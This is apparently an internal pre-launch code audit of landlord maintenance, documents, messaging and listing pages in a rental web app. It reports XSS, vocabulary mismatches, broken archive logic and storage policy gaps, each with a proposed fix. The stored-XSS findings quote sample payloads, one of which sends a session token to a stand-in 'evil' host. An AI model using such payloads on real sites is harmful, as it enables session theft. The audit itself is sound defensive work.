# Detailed review: maintenance, documents, messaging and listing pages

Part of the 2026-10-09 pre-launch audit (see ../LAUNCH-READINESS.md). Produced by a read-only code review of each page against CLAUDE.md and the live schema. CONFIRMED = traced in code; SUSPECTED = needs a runtime check. Findings marked CONFIRMED were spot-checked by the lead reviewer where noted in ../FUNCTIONAL-AUDIT.md.

> **Correction (lead review):** the finding "Stored XSS through `status` in the request table" (maintenance-requests.html:2247-2250) is **not exploitable**: `maintenance_requests.status` has a CHECK constraint limiting it to 'Open', 'In Progress', 'Resolved'. Keep the escaping fix as defense in depth (P3). The urgency finding is real and is worse than described: the constraint allows Low/Normal/High/Emergency, so the landlord pages' "Medium" value is rejected by the database.

# Review D: landlord-side maintenance, documents, messaging, listings

Scope: maintenance-requests.html, add-maintenance-request.html, maintenance-history.html, property-documents.html, tenant-messages.html, publish-listing.html, plus supabase/functions/maintenance-acknowledgment/index.ts. Read-only code review on 2026-10-09. Every column used in `.from()` queries was checked against the live schema dump (schema.txt). RLS, grants and table definitions were checked in `supabase/rentalgenie-project/migrations/`. Inline scripts of all six pages pass `node --check`.

## Inventory

| Page | Purpose | Users | Reached from | Status (code-reviewed) | Value H/M/L | Recommendation | Priority |
|---|---|---|---|---|---|---|---|
| maintenance-requests.html | Main landlord work queue: filter, start or complete requests, edit, archive, open tenant photos, log the cost as an expense, approve or deny tenant reimbursements | Landlord | Main nav "Maintenance" on every page, mobile bottom nav, dashboard, property-management (`?property_id=`), add-maintenance-request | Partial: tenant urgency values break Edit; Delete looks like it failed and archived rows stay visible; stored XSS through `status` | H | KEEP + fix | P1 |
| add-maintenance-request.html | Landlord logs a request by hand (vendor, cost, schedule, notes) | Landlord | Only the "Add Request" button on maintenance-requests | Working, with vocabulary drift ("Pending Quote") | M | KEEP (or MERGE into a modal on maintenance-requests) | P2 |
| maintenance-history.html | Read-only log of all requests with KPIs, filters, CSV/Excel export | Landlord | maintenance-cost.html and all-properties-summary.html only (no main nav link) | Partial: stored XSS, the "Assigned To" column is always blank, "Resolved" is never counted as done, no company scope | M→L | MERGE into maintenance-requests (add a "Closed/All" view + export) or fix | P0 (XSS) |
| property-documents.html | Landlord uploads or deletes per-tenant documents (private bucket `tenant-documents`) | Landlord | Only property-overview.html (`goDocuments()`) | Working: files open through signed links (rgFiles); escaping is correct | M | KEEP; add a nav entry and an auth redirect | P2 |
| tenant-messages.html | Landlord inbox: threads grouped by tenant+property, reply, resolve or reopen | Landlord | Nav "Messages" and the nav bell | Working; read/unread is not implemented; escaping is correct | H | KEEP + IMPROVE (unread) | P2 |
| publish-listing.html | Edit the public listing fields and application mode, review applications, screening tracker, message applicants | Landlord | listings.html, property-overview.html | Working. The Oct 2026 hardening is confirmed: createElement-only rendering, `safeUrl` on photo and apply URLs | H | KEEP; align the auth bootstrap | P2 |

## Findings

### [P0][CONFIRMED] Stored XSS against the landlord through the `issue_description` title attribute: maintenance-history.html:970 (esc at 719)
**Problem:** `esc()` escapes only `& < >`, not quotes. The page puts its output inside a double-quoted attribute.
```js
function esc(s) { return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }   // :719
+ '<td class="desc-cell"><span class="desc-text" title="' + esc(desc) + '">' + esc(desc) + '</span></td>'  // :970
```
`desc = r.issue_description`. Tenants write this field through the normal tenant-repair-requests form, with no API tricks needed. A value like `x" onmouseover="fetch('//evil?'+localStorage['sb-…'])` breaks out of the attribute. The script then runs in the landlord's session when they hover the row (or add `tabindex/autofocus onfocus`).
**Why it matters:** Tenants are external users. The landlord session holds the auth token and full company access (leases, bank details in `leases.pay_ach_*`, rent log).
**Smallest fix:** Make `esc` also replace `"`→`&quot;` and `'`→`&#39;`, or build the cell with `createElement` + `textContent` + `el.title = desc`.

### [P1][CONFIRMED] Stored XSS through `status` in the request table: maintenance-requests.html:2247-2250, used at :2473
**Problem:** `getStatusPill` puts the raw `status` into both a class attribute and the element body:
```js
return `<span class="status-pill ${statusClass}">${status}</span>`;
```
The tenant insert policy `maintenance_requests_insert_tenant_self` (rg_03 policies:379-380) checks only `tenant_email` and `rg_tenant_can_file`. `authenticated` has full INSERT on the table (rg_04:7-18). No check constraint or trigger restricts `status`. Any tenant with a lease can therefore POST a request with `status: "<img src=x onerror=…>"` using the anon key plus their own JWT. It renders on the landlord's main maintenance page.
**Why it matters:** Same impact as above, on the most-used landlord page.
**Smallest fix:** `escapeHtml(status)` in the body, and strip `statusClass` to `[a-z-]`. Defence in depth: add a DB `CHECK (status in ('Open','In Progress','Resolved',...))`, or a trigger that forces `status='Open'` on tenant inserts.
Also: `error.message` goes unescaped into innerHTML at :2399 (P3, not attacker-controlled). add-maintenance-request.html:483 `showMsg` does the same with `err.message` (P3).

### [P1][CONFIRMED] The urgency vocabularies don't match: requests filed by tenants can't be edited, and "Emergency" is never treated as high priority. maintenance-requests.html:1606-1610, 1701-1704, 2715
**Problem:** tenant-repair-requests.html sends `urgency_level` `Normal` (the default, :864), `High` or `Emergency` (:739-741). The landlord page knows only `High/Medium/Low`. In `openEditModal`, setting `edit_urgency_level.value = "Normal"` matches no option, so `.value` becomes `""`. `saveEdit` then sends `urgency_level: null` (:2715). The column is `not null` (rg_01:266), so every save fails with "Failed to save". Emergency requests are also left out of the "High Priority" KPI (:2459) and the `quick=high` chip (:2421). maintenance-history's urgency filter and KPI (:917-921) have the same gap. The ack email gives priority wording only for "high" (index.ts:78).
**Why it matters:** Landlords can't assign a vendor or cost to most tenant-filed requests. A real emergency looks like a normal request.
**Smallest fix:** Settle on one set of values (for example Low/Normal/High/Emergency). Add the missing options to both selects and the filters, and treat Emergency as at least High in the counts.

### [P1][CONFIRMED] Delete (archive) reports failure, and archived requests never leave the list: maintenance-requests.html:2757-2775, 2370
**Problem:** `confirmDelete` calls `closeModal()` (:2770), which is not defined anywhere in the file. The RPC `archive_maintenance_request` exists (rg_02:45) and succeeds. The next line throws a ReferenceError, which the catch block turns into `alert("Failed to archive request.")`, and `loadRequests()` never runs. If the RPC errors, the fallback updates `archived` / `is_archived`, columns that don't exist (the schema has `archived_at`). Separately, `loadRequests` selects from `maintenance_requests` without `.is('archived_at', null)` (or `active_maintenance_requests`), so archived rows keep showing after a reload. maintenance-history.html:866 has the same problem.
**Why it matters:** The landlord sees an error, and the "deleted" request is still there. They will likely retry or give up.
**Smallest fix:** Remove the `closeModal()` call and the bogus column fallbacks. Filter `archived_at is null`, or query `active_maintenance_requests` (it lacks `tenant_id`, `photo_urls` and `photo_paths`, so a filter on the base table is simpler).

### [P2][CONFIRMED] Status vocabulary drift across pages ("Resolved" vs "Completed", "Pending Quote")
- maintenance-requests writes `Resolved` (:2189, :1712). But `saveEdit` sets `completed_at` only for `Completed`/`Closed` (:2732). Completing through the Edit modal therefore never stamps `completed_at`, which skews "Avg completion".
- maintenance-history counts done only when status includes `complet` or `closed` (:920, :959). Its status filter offers open/in progress/completed/closed (markup ~586-592). Every request completed on the main page (`Resolved`) shows as an "open"-styled chip, is left out of "Completed", and can't be filtered.
- add-maintenance-request offers `Pending Quote` (:362). On maintenance-requests, such a request has both Start and Complete disabled (`canStart`/`canComplete`, :2183-2184). It is counted in neither Open nor In Progress. Opening Edit blanks the status select, so a save sends `status: null` and violates `not null`.
**Smallest fix:** One shared status list (Open / In Progress / Pending Quote / Resolved). Update the selects, filters and `completed_at` logic to use it.

### [P2][CONFIRMED] maintenance-history: wrong columns and no company scope: maintenance-history.html:964, 995, 842, 866
- `r.assigned_to || r.vendor`: neither column exists (schema NOTE). The real column is `assigned_vendor`, so "Assigned To" is always "—" on screen and in the CSV.
- `r.description` fallback (:963, :993) doesn't exist either (harmless only because of the fallback).
- Properties and requests are loaded with no `company_id` filter, unlike the other pages that use `rg_active_company_id`. A user in two companies, or a landlord who is also a tenant (`maintenance_requests_select_tenant_self`), gets mixed rows.
- The CSV exports `rawData`, not the filtered rows (:985), despite the "filter … and export" subtitle. Tenant text isn't neutralised against formula injection (`=`, `+`, `-`, `@`) (P3).
**Smallest fix:** Use `assigned_vendor`, add `.eq('company_id', activeCompanyId)` and `.is('archived_at', null)`, and export the filtered set.

### [P2][CONFIRMED] The property link from Property Management is ignored: maintenance-requests.html:2262 vs property-management.html:2237
**Problem:** property-management links to `maintenance-requests.html?property_id=<uuid>&company_id=…`. The page reads only `params.get("property")`, so the filter is dropped and every property is shown. dashboard.html:3089 sends `?view=pending`, which is also ignored (P3).
**Smallest fix:** `currentFilters.property = params.get("property") || params.get("property_id") || ""`.

### [P2][CONFIRMED] tenant-messages: read/unread is not implemented: tenant-messages.html (whole page)
**Problem:** `tenant_messages.read_at` exists (rg_01:338-351), but no page in the repo reads or writes `read_at` (grep across *.html returns nothing). The landlord inbox has no unread state, the nav bell (`#navBell`) shows no count, and opening a thread marks nothing as read. The conversation status is the last message's status. The maintenance acknowledgment Edge Function inserts a `sender:'landlord'`, `status:'open'` message for every tenant-filed request (index.ts:93-104). Every new request therefore surfaces in the inbox as an "Open" conversation whose last message is the auto-reply, which hides whether the tenant wrote anything new.
**Smallest fix:** On `openConvo`, update `read_at = now()` where `sender='tenant' and read_at is null`. Show a bold or unread dot plus a count on the bell. Optionally insert the auto-ack with `status='closed'` or skip it in grouping.

### [P2][CONFIRMED] property-documents: no sign-in redirect and a non-canonical bootstrap: property-documents.html:735-770, 1036-1046
**Problem:** When `getUser()` returns no user, `setupAuth` returns null and boot continues. There is no `getSession()` fallback and no redirect to `login.html?returnTo=`, and the `auth-ready`/`auth-guest` body classes are never set. A signed-out visitor sees an empty page with an Upload button. It uses a full-screen `#authOverlay` (:64-66) instead of the 3px shimmer, with a 5s `setTimeout` fallback. It isn't in the main nav. The only entry point is property-overview.html:1083.
**Smallest fix:** Copy the lease-rent-center bootstrap (getUser → getSession → redirect) and add "Documents" to the user menu or drawer.

### [P2][CONFIRMED] property-documents: delete removes only the row, and the tenant picker includes ended leases: property-documents.html:939-945, 843-848
**Problem:** `_deleteDoc` hard-deletes the `tenant_documents` row but leaves the storage object (the `rg_tenant_docs_delete` policy allows removing it), which builds up orphaned files holding tenant PII. `loadLeases` doesn't filter `archived_at` or `status`, so ended or archived tenants appear in the upload picker. File downloads are correct: every link goes through `rgFiles.attr('tenant-documents', file_path || file_url)` + `hydrate` (signed URL). Upload stores both `file_path` and a dead `getPublicUrl` URL (harmless: rgFiles parses it). Escaping via `safe()` is complete.
**Smallest fix:** Call `client.storage.from('tenant-documents').remove([d.file_path])` after the row delete, and filter leases on `archived_at is null`.

### [P2][CONFIRMED] Reimbursement approval isn't atomic: maintenance-requests.html:2846-2884
**Problem:** Approval inserts the expense first and then updates the reimbursement. If the update fails, the alert says so but the row stays "Pending", and approving again creates a second expense. The expense insert omits `property_id` (the fill trigger covers it). Receipts open through signed links (`rgFiles.attr('receipts', receipt_path || receipt_url)`), which is correct for the private `receipts` bucket.
**Smallest fix:** Move approval into a `SECURITY DEFINER` RPC that inserts the expense and updates the reimbursement in one transaction (or at least check `status='Pending'` in the update and skip when `expense_id` is already set).

### [P2][SUSPECTED] The acknowledgment Edge Function can send email to any address, with attacker text, from the Rental Genie sender: supabase/functions/maintenance-acknowledgment/index.ts:74-121
**Problem:** The trigger fires on every insert (rg_03:258), including landlord inserts. Any signed-up user can create a company (maintenance-requests.html:1948-1957 does it client-side) and insert `maintenance_requests` with `tenant_email = victim@…` and an arbitrary `issue_description`. The function then emails that text, quoted, from `FROM_EMAIL` via Resend. No check ties the email to a real tenant or lease. The header comment says landlord-logged requests are skipped, but that holds only when they leave the email blank. add-maintenance-request has an optional tenant email field (:335).
**Why it matters:** A phishing or spam relay with the product's verified sender reputation. It also surprises landlords who log a request "for" a tenant.
**Smallest fix:** In the function, send only when `tenant_id` is set or a non-archived lease with that `tenant_email` exists for `company_id`, and skip when the inserting user is a company member.

### [P2][CONFIRMED] publish-listing: the auth bootstrap doesn't follow CLAUDE.md, and failed writes are silent: publish-listing.html:231-235, 636, 655, 665, 715-722
**Problem:** It creates its own client with default storage: no `safeStorage` in-memory fallback, no `window._rgClient` reuse, no `waitForClientReady`, no `getSession` fallback. That is the documented cause of the "logged in but no data" bugs under tracking prevention. The redirect goes to `login.html` without `returnTo`. The application status, screening status and report-URL updates `await` without checking `error`, so a failure reloads silently and "Save" on the report URL gives no feedback. `listing_published_at` is reset on every save while public (:490), so the listing looks newly published each time (P3). Approving an application doesn't create a tenant or lease (workflow gap, P3). Confirmed hardened: all applicant data is rendered through `h()`/`textContent`, status class names are allowlisted (:571), and photo and apply URLs pass `safeUrl` (http/https only) before saving.
**Smallest fix:** Swap in the lease-rent-center bootstrap block. Check `error` on each update and show `setMessage`.

### [P3][SUSPECTED] rgFiles passes non-storage links through unchanged: maintenance-requests.html:1407-1411 (same helper in property-documents.html:408-412)
**Problem:** `photo_paths`/`photo_urls` (tenant-written) and `reimbursement_requests.receipt_url` (tenant-written, `not null`) are resolved by `rgFiles`. `data:`/`blob:` values and any `https://` URL that isn't a storage URL become the `href` of the "📷 n" or "🧾 View" button unchanged. `javascript:` is not reachable (non-http values go to `createSignedUrl`). A tenant can, however, make the landlord's "receipt" button open an arbitrary external site (phishing). Modern browsers block top-level `data:` navigation.
**Smallest fix:** For values written by tenants, accept only storage paths or URLs that match this project's `/storage/v1/object/` host. Otherwise drop the link.

### [P3][SUSPECTED] Storage SELECT policies aren't scoped to a company (DB, outside these pages): rg_04_grants_storage.sql:75-86, 91-94
**Problem:** `rg_maint_photos_select` and `rg_receipts_reimb_select` let any authenticated user read an object if any row anywhere references its path. `reimbursement_requests_insert_tenant_self` (rg_03:404-405) checks only `tenant_email = rg_auth_email()`, with no `rg_tenant_can_file` and no company check. A user who knows or guesses a path such as `expenses/<company_id>/<file>` can insert a reimbursement row pointing at it and gain read access to another landlord's receipt. The same user can also inject pending reimbursements into any company whose id they know. Exploiting this requires knowing object names (timestamped), hence SUSPECTED.
**Smallest fix:** Add `rg_tenant_can_file(company_id, property_id, tenant_id)` to the reimbursement insert policy, and require `receipt_path` to start with `auth.uid()::text || '/'`.

### [P3][CONFIRMED] Smaller CLAUDE.md, UX and mobile items
- **Template-string innerHTML:** maintenance-requests (:2452-2477, :2813-2824) builds rows with template strings and inline `onclick`. Escaping is present except for status (above). New work should use createElement.
- **Loading pattern:** maintenance-history (:63), tenant-messages (:28) and property-documents (:64) use a full-screen `#authOverlay` spinner instead of the 3px shimmer. maintenance-requests and add-maintenance-request do this correctly.
- **`body { overflow-x:hidden }`** is missing in maintenance-history, tenant-messages, property-documents and add-maintenance-request. maintenance-requests has it only under 600px (:1368).
- **Mobile tables:** maintenance-history (8 columns) and property-documents (7 columns) scroll sideways in `.table-wrap` instead of collapsing to cards. maintenance-requests collapses correctly (:788ff, with `data-label`).
- **Breakpoint:** add-maintenance-request.html:76 `@media(max-width:1440px)` hides the desktop nav and user menu on ordinary laptops, and contradicts :75.
- **Nav:** inconsistent across the six pages. Desktop nav: maintenance-requests and property-documents show 6 labels plus a bell; add, history and messages show 7 including "Messages". publish-listing has no site nav at all, only a back link. tenant-messages and publish-listing have no mobile bottom nav. User menus link "Tenant Portal" to `tenant-portal.html` (add-maintenance-request:266, 435) instead of `tenant-portal-picker.html`. `withProp()` is not used on any of these pages.
- **Login redirect:** maintenance-requests.html:2233 redirects to `login.html?redirect=<absolute href>`. login.html:556 rejects values containing `://`, so the user lands on the dashboard instead of returning.
- **localStorage:** maintenance-requests reads and writes `localStorage` directly without try/catch (:1830, :1938, :1990), unlike the safeStorage pattern.
- **Reply notification:** tenant-messages sends replies without notifying the tenant (no email). Fine for v1, but tenants must check the portal.
- **Target blank:** `target="_blank"` on rgFiles links points at signed supabase.co URLs (external), so it doesn't break the internal-link rule.

## Notes

- **Column check summary:** every column in `.from()` select/insert/update calls on these pages exists in the live schema, except: maintenance-history `assigned_to`, `vendor`, `description`; maintenance-requests fallback `archived`, `is_archived`, plus guarded reads of `priority`, `vendor`, `cost`, `issue_summary`, `tenant_name`. The guarded reads are harmless because they sit behind `availableCols` or `||` fallbacks, but they are dead code. add-maintenance-request guards `vendor`/`cost` the same way. No query asks for `is_late_fee`, `priority` (as a filter), `owner_id` on companies, or `tenant_documents.file_name`/`created_at`.
- **Private-bucket compliance:** all file opens on these pages (maintenance photos, reimbursement receipts, tenant documents) go through `rgFiles` signed links. None relies on a raw public URL.
- **Tenant-side company_id:** not applicable to these landlord pages. The tenant repair form sends `company_id` from the lease (tenant-repair-requests.html:1161).
- **Value / overlap:**
  - maintenance-history repeats maintenance-requests' data with weaker logic (wrong columns, XSS, no scope, no archive filter), and no primary nav reaches it. Recommend MERGE: add a "Resolved/All" tab and a CSV export to maintenance-requests, then retire history after checking its inbound links (maintenance-cost.html, all-properties-summary.html:518). Ask before deleting, per CLAUDE.md.
  - maintenance-cost.html reads `expenses` (category spend), a different dataset, so KEEP it as a report.
  - add-maintenance-request could become a modal, but works as a page, so KEEP.
- **Out of scope but noticed:** tenant-repair-requests.html is the tenant-side source of the urgency and status values. Fixing the vocabulary needs a coordinated change there.
